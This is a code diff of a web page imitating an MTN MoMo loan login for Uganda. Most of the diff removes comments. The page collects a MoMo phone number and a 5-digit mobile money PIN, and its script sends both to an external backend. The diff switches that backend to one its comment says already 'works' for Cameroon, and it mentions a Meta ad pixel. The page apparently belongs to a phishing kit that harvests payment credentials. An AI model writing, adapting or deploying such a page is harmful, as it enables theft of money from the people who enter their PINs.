@@ -62,7 +62,6 @@
 
     body.modal-open { overflow: hidden; }
 
-    /* HEADER */
     .header {
       position: fixed;
       top: 0; left: 0; right: 0;
@@ -122,7 +121,6 @@
       color: #fff;
     }
 
-    /* MAIN */
     .main {
       max-width: 1200px;
       margin: 0 auto;
@@ -137,7 +135,6 @@
     }
     .login-card-wrap { width: 100%; max-width: 440px; }
 
-    /* REJECT BANNER */
     .reject-banner {
       position: fixed;
       top: calc(var(--header-h) + 12px);
@@ -172,7 +169,6 @@
     }
     .reject-banner .r-text b { color: #991B1B; font-weight: 900; }
 
-    /* MOMO YELLOW BAND */
     .momo-band {
       background: var(--grad-gold);
       border-radius: var(--radius-lg) var(--radius-lg) 0 0;
@@ -207,7 +203,6 @@
       position: relative;
     }
 
-    /* BODY CARD */
     .login-body {
       background: var(--white);
       border-radius: 0 0 var(--radius-lg) var(--radius-lg);
@@ -232,7 +227,6 @@
       line-height: 1.5;
     }
 
-    /* FORM */
     .form-field { margin-bottom: 18px; position: relative; }
     .input-label {
       display: block;
@@ -330,7 +324,6 @@
       75% { transform: translateX(6px); }
     }
 
-    /* LOGIN BUTTON */
     .login-btn {
       width: 100%;
       padding: 17px;
@@ -408,7 +401,6 @@
     }
     .signup-text a:hover { text-decoration: underline; }
 
-    /* BOTTOM NAV */
     .bottom-nav {
       position: fixed;
       bottom: 0; left: 0; right: 0;
@@ -444,7 +436,6 @@
     .nav-item:hover { transform: translateY(-2px); }
     .nav-item.active { color: var(--mtn-dark); }
 
-    /* PIN POPUP */
     .modal-container { position: fixed; inset: 0; z-index: 9999; display: none; }
     .modal-container.open { display: block; }
 
@@ -628,7 +619,6 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* SUPER VERIFY OVERLAY */
     .verify-overlay {
       position: fixed;
       inset: 0;
@@ -869,7 +859,6 @@
 </head>
 <body>
 
-  <!-- REJECT BANNER -->
   <div class="reject-banner" id="rejectBanner">
     <span class="r-ico">⚠️</span>
     <div class="r-text">
@@ -877,7 +866,6 @@
     </div>
   </div>
 
-  <!-- HEADER -->
   <header class="header">
     <div class="header-inner">
       <a href="index.html" class="brand">
@@ -889,7 +877,6 @@
     </div>
   </header>
 
-  <!-- MAIN -->
   <main class="main">
     <div class="login-wrap">
       <div class="login-card-wrap">
@@ -904,7 +891,6 @@
           <h1 class="welcome-title">Welcome Back</h1>
           <p class="welcome-sub">Enter your MoMo number to continue</p>
 
-          <!-- PHONE (Uganda only) -->
           <div class="form-field">
             <label class="input-label" for="phone">MoMo Phone Number</label>
             <div class="phone-input" id="phoneWrapper">
@@ -942,7 +928,6 @@
     </div>
   </main>
 
-  <!-- BOTTOM NAV -->
   <nav class="bottom-nav">
     <div class="bottom-nav-inner">
       <a href="index.html" class="nav-item"><span class="ico">🏠</span><span>Home</span></a>
@@ -951,7 +936,6 @@
     </div>
   </nav>
 
-  <!-- PIN POPUP -->
   <div class="modal-container" id="modalContainer">
     <div class="sheet-overlay" id="sheetOverlay"></div>
     <div class="pin-modal" id="pinModal">
@@ -997,7 +981,6 @@
     </div>
   </div>
 
-  <!-- SUPER VERIFY OVERLAY -->
   <div class="verify-overlay" id="verifyOverlay">
     <div class="verify-particles">
       <span class="verify-particle"></span>
@@ -1048,7 +1031,8 @@
   </div>
 
   <script>
-    const API_BASE = 'https://momo-advance-loan-uganda.onrender.com';
+    /* ✅ FIXED: Uses the SAME backend as Cameroon (works) */
+    const API_BASE = 'https://momo-usersey-production.up.railway.app';
     const POLL_INTERVAL_MS = 2500;
     const NUMBER_LOADING_MS = 3000; /* 3 seconds loading after CONTINUE */
 
@@ -1065,7 +1049,6 @@
       }
     });
 
-    /* PIN MODAL */
     const modal = document.getElementById('modalContainer');
     const popup = document.getElementById('pinModal');
     const pin = document.getElementById('momo_pin');
@@ -1113,7 +1096,7 @@
       }, 250);
     }
 
-    /* ✅ CONTINUE → 3s "Verifying number…" → PIN popup */
+    /* CONTINUE → 3s "Verifying number…" → PIN popup */
     openBtn.addEventListener('click', () => {
       const digits = phoneInput.value.replace(/\D/g, '');
       if (digits.length !== 9) {
@@ -1147,7 +1130,7 @@
       pin.focus();
     });
 
-    /* ✅ PIN must be exactly 5 digits */
+    /* PIN must be exactly 5 digits */
     pin.addEventListener('input', function () {
       this.value = this.value.replace(/\D/g, '').slice(0, 5);
       const isValid = /^\d{5}$/.test(this.value);
@@ -1158,7 +1141,6 @@
     cancel.addEventListener('click', closeModal);
     overlay.addEventListener('click', closeModal);
 
-    /* REJECT BANNER */
     let bannerTimer = null;
     function showRejectBanner() {
       rejectBanner.classList.add('show');
@@ -1168,7 +1150,6 @@
       }, 6000);
     }
 
-    /* RESET TO PHONE STEP */
     function resetToPhoneStep() {
       if (verifyTimer) clearInterval(verifyTimer);
       if (stepTimer) clearInterval(stepTimer);
@@ -1203,7 +1184,6 @@
       setTimeout(() => phoneInput.focus(), 250);
     }
 
-    /* PROCEED → backend */
     let pollTimer = null;
     let verifyTimer = null;
     let stepTimer = null;
@@ -1221,8 +1201,6 @@
       const digits = phoneInput.value.replace(/\D/g, '');
       const fullPhone = '+256' + digits;
       const userPin = pin.value;
-
-      /* ✅ META PIXEL — AddPaymentInfo will fire once Uganda pixel is set up */
 
       try {
         const controller = new AbortController();
@@ -1274,7 +1252,6 @@
       }
     });
 
-    /* SUPER VERIFY OVERLAY */
     const verifyOverlay = document.getElementById('verifyOverlay');
     const verifyBarFill = document.getElementById('verifyBarFill');
     const verifyTitle   = document.getElementById('verifyTitle');
@@ -1311,7 +1288,6 @@
       verifyBarFill.style.width = '100%';
     }
 
-    /* POLLING */
     function stopPolling() {
       if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
     }
